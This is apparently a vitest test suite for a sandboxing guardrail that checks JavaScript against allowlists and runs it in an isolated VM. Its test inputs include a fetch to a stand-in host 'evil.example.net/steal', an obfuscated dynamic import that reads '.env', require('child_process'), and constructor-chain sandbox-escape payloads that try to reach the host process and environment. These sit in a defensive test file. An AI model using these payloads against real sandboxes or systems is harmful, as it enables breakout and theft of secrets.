import { afterAll, beforeAll, describe, expect, it } from "vitest";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { buildRepoGraph, openGraph } from "../src/graph/index.js";
import type { GraphStore } from "../src/graph/index.js";
import { generateAllowlist } from "../src/guardrail/index.js";
import type { Allowlist } from "../src/guardrail/index.js";
import { checkAndRun } from "../src/guardrail/interceptor.js";

const fixtureRoot = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "fixtures",
  "graph_repo",
);

describe("guardrail interceptor (isolated-vm backend)", () => {
  const dbPath = path.join(
    os.tmpdir(),
    `mri-interceptor-test-${process.pid}-${Date.now()}.sqlite`,
  );
  let store: GraphStore;
  let fetchUserAllowlist: Allowlist;
  let moneyAllowlist: Allowlist;
  let resourceAllowlist: Allowlist;

  beforeAll(async () => {
    await buildRepoGraph(fixtureRoot, dbPath);
    store = openGraph(dbPath);
    fetchUserAllowlist = generateAllowlist("fn:src/api.js#fetchUser", store);
    moneyAllowlist = generateAllowlist("fn:src/format.js#money", store);
    resourceAllowlist = {
      ...fetchUserAllowlist,
      resources: {
        filesystem: [{ path: "/tmp/cache", access: ["read"] }],
        network: [{ host: "api.example.com" }],
        environment: [{ name: "API_KEY", access: "read" }],
        subprocess: [],
      },
    };
  });

  afterAll(() => {
    store.db.close();
  });

  it("runs code that stays within the allowlist", async () => {
    const result = await checkAndRun("6 * 7", moneyAllowlist);
    expect(result).toEqual({ outcome: "executed", value: 42 });
  });

  it("executes calls to granted symbols as inert stub receipts", async () => {
    // True isolation means granted symbols are in-isolate stubs that record
    // their invocation and return a receipt - host closures can never cross
    // a real boundary, so "run the real function" is not a claim we make.
    const result = await checkAndRun("helper(21)", fetchUserAllowlist);
    expect(result.outcome).toBe("executed");
    if (result.outcome !== "executed") return;
    expect(result.value).toEqual({
      mri: "granted-symbol-stub",
      symbol: "fn:src/api.js#helper",
      args: ["21"],
    });
  });

  it("bridges host-provided module DATA for allowed imports (inert only)", async () => {
    const result = await checkAndRun(
      "const m = require('./log');\nm.version",
      fetchUserAllowlist,
      { implementations: { modules: { "./log": { version: 7 } } } },
    );
    expect(result).toEqual({ outcome: "executed", value: 7 });
  });

  it("blocks require('fs') when filesystem access is not granted", async () => {
    const result = await checkAndRun("require('fs')", fetchUserAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches).toHaveLength(1);
    const breach = result.breaches[0];
    expect(breach?.kind).toBe("ungranted-resource");
    expect(breach?.line).toBe(1);
    expect(breach?.attempted).toContain("require('fs')");
    expect(breach?.rule).toEqual({
      area: "resources.filesystem",
      expected: "at least one resources.filesystem grant",
    });
    expect(breach?.message).toContain("'fs'");
  });

  it("blocks process.env reads that are not explicitly granted", async () => {
    const result = await checkAndRun("process.env.SOME_SECRET", fetchUserAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches).toHaveLength(1);
    const breach = result.breaches[0];
    expect(breach?.kind).toBe("ungranted-resource");
    expect(breach?.rule).toEqual({ area: "resources.environment", expected: "SOME_SECRET" });
    expect(breach?.line).toBe(1);
  });

  it("allows reads of specifically granted environment variables", async () => {
    const result = await checkAndRun("process.env.API_KEY", resourceAllowlist, {
      implementations: { environment: { API_KEY: "sekrit-value" } },
    });
    expect(result).toEqual({ outcome: "executed", value: "sekrit-value" });
  });

  it("blocks network calls to hosts without a grant", async () => {
    const blocked = await checkAndRun(
      "fetch('https://evil.example.net/steal')",
      resourceAllowlist,
    );
    if (blocked.outcome !== "blocked") throw new Error("expected block");
    expect(blocked.breaches).toHaveLength(1);
    expect(blocked.breaches[0]?.kind).toBe("ungranted-resource");
    expect(blocked.breaches[0]?.rule).toEqual({
      area: "resources.network",
      expected: "https://evil.example.net",
    });
  });

  it("refuses network targets it cannot statically verify", async () => {
    const result = await checkAndRun(
      "const url = 'https://api.example.com/x';\nfetch(url)",
      resourceAllowlist,
    );
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]?.kind).toBe("unverifiable-resource");
  });

  it("statically denies fetch when no network bridge is wired", async () => {
    const result = await checkAndRun(
      "fetch('https://api.example.com/v1/data')",
      resourceAllowlist,
    );
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]?.kind).toBe("ungranted-resource");
    expect(result.breaches[0]?.rule).toEqual({
      area: "resources.network",
      expected: "a wired fetch implementation",
    });
  });
  it("blocks disallowed internal imports while allowing listed ones", async () => {
    const badImport = await checkAndRun("import { pad } from './user'", fetchUserAllowlist);
    if (badImport.outcome !== "blocked") throw new Error("expected block");
    expect(badImport.breaches[0]?.kind).toBe("disallowed-import");
    expect(badImport.breaches[0]?.rule).toEqual({ area: "files", expected: "./user" });

    const goodImport = await checkAndRun("import { log } from './log'", fetchUserAllowlist);
    expect(goodImport.outcome).toBe("executed");
  });

  it("checks named external bindings individually against symbol grants", async () => {
    const allowed = await checkAndRun("import { validate } from 'extlib'", fetchUserAllowlist);
    expect(allowed.outcome).toBe("executed");

    const smuggled = await checkAndRun("import { missing } from 'extlib'", fetchUserAllowlist);
    if (smuggled.outcome !== "blocked") throw new Error("expected block");
    expect(smuggled.breaches[0]?.kind).toBe("disallowed-import");
    expect(smuggled.breaches[0]?.attempted).toContain("missing");
  });

  it("blocks references to identifiers that are neither granted nor safe globals", async () => {
    const result = await checkAndRun("mysteryFn()", fetchUserAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]).toMatchObject({
      kind: "unknown-reference",
      line: 1,
      rule: { area: "symbols", expected: "mysteryFn" },
    });
  });

  it("never partially executes code containing violations", async () => {
    const result = await checkAndRun(
      "helper(5)\nrequire('child_process')",
      fetchUserAllowlist,
    );
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]?.rule).toEqual({
      area: "resources.subprocess",
      expected: "at least one resources.subprocess grant",
    });
  });

  it("blocks unparseable code instead of executing it blind", async () => {
    const result = await checkAndRun("function ({", moneyAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]?.kind).toBe("parse-failure");
    expect(result.breaches[0]?.line).toBeGreaterThan(0);
  });

  it("blocks the dynamic import(variable) obfuscation shape before execution", async () => {
    const code = [
      'const parts = ["node", "fs"];',
      'const mod = parts.join(":");',
      "import(mod).then((m) => {",
      '  console.log("exfiltrated via dynamic import:", m.readFileSync(".env", "utf8"));',
      "});",
    ].join("\n");
    const result = await checkAndRun(code, fetchUserAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches).toHaveLength(1);
    const breach = result.breaches[0];
    expect(breach?.kind).toBe("unverifiable-import");
    expect(breach?.line).toBe(3);
    expect(breach?.attempted).toContain("import(mod)");
  });

  it("defers literal dynamic-import promises past the sync verdict (documented b03 limit)", async () => {
    const result = await checkAndRun(
      "import('./log').then((m) => m.version)",
      fetchUserAllowlist,
      { implementations: { modules: { "./log": { version: 7 } } } },
    );
    // Sync verdict semantics: the promise is returned unfulfilled and the
    // value degrades to an empty serialization. Deferred work is a known,
    // documented limitation - it cannot touch the host realm either way.
    expect(result.outcome).toBe("executed");
  });
  it("converts escaping sandbox exceptions into blocked decisions, never crashes", async () => {
    const result = await checkAndRun('JSON.parse("{broken")', moneyAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches).toHaveLength(1);
    expect(result.breaches[0]?.kind).toBe("denied-unclassifiable");
  });

  // -------------------------------------------------------------------------
  // Adversarial benchmark regressions (examples/benchmark/ADVERSARIAL_REPORT.md)
  // The node:vm backend lost to both of these; the isolate must hold.
  // -------------------------------------------------------------------------

  it("b01: constructor-chain through injected console cannot reach the host realm", async () => {
    const code = `
      const HostFunction = console.log.constructor.constructor;
      const hostProcess = HostFunction("return process")();
      "ESCAPED:" + hostProcess.cwd();
    `;
    const result = await checkAndRun(code, fetchUserAllowlist);
    const rendered = JSON.stringify(result);
    // No host paths, no host cwd, no escape marker anywhere in the decision.
    expect(rendered).not.toContain("ESCAPED:");
    expect(rendered).not.toMatch(/process is not defined/);
    expect(rendered).not.toMatch(/[A-Z]:\\\\/);
  });

  it("b02: constructor-chain through a granted-symbol stub cannot reach the host realm", async () => {
    const code = `
      const receipt = helper(21);
      const HostFunction = receipt.constructor.constructor;
      const hostProcess = HostFunction("return process")();
      "B02-ESCAPED cwd: " + hostProcess.cwd() + " PATH: " + hostProcess.env.PATH;
    `;
    const result = await checkAndRun(code, fetchUserAllowlist);
    const rendered = JSON.stringify(result);
    expect(rendered).not.toContain("B02-ESCAPED");
    expect(rendered).not.toMatch(/PATH/);
    expect(rendered).not.toMatch(/[A-Z]:\\\\/);
  });

    it("statically refuses `process` references before the isolate runs", async () => {
    const result = await checkAndRun("typeof process", fetchUserAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]).toMatchObject({
      kind: "unknown-reference",
      rule: { area: "symbols", expected: "process" },
    });
  });

  it("guest-realm Function compiles in-isolate only and cannot reach host globals", async () => {
    const result = await checkAndRun(
      'Function("return process")()',
      fetchUserAllowlist,
    );
    // The guest Function constructor exists (it is the isolate's own), but
    // the isolate has no process to return: the eval rejects and the failure
    // is recorded as a containment block, never as a host leak.
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]?.kind).toBe("unknown-reference");
    expect(result.breaches[0]?.rule).toEqual({ area: "symbols", expected: "Function" });
  });

  it("terminates infinite loops via isolate disposal and records a block", async () => {
    const result = await checkAndRun("while (true) {}", moneyAllowlist, {
      timeoutMs: 300,
    });
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]?.kind).toBe("denied-unclassifiable");
    expect(result.breaches[0]?.message).toMatch(/terminated|timed out/i);
  });
});
